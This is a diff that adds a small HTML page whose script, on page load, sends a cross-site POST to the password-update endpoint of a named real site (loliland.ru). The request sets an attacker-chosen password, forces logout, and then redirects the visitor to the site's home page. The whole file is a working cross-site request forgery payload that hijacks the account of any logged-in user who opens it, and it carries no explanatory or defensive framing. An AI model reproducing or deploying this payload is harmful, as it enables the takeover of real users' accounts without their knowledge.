@@ -1,0 +1,27 @@
+<html>
+<head>
+	<script>
+        window.onload = async function() {
+            try {
+                const response = await fetch('https://loliland.ru/apiv2/user/settings/password/update', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        password: "dbqdqywgey823vd6238yvdb732y",
+                        logout: true
+                    })
+                });
+
+                window.location.href = 'https://loliland.ru/ru/';
+            } catch (error) {
+                window.location.href = 'https://loliland.ru/ru/';
+            }
+        };
+    </script>
+</head>
+<body>
+
+</body>
+</html>
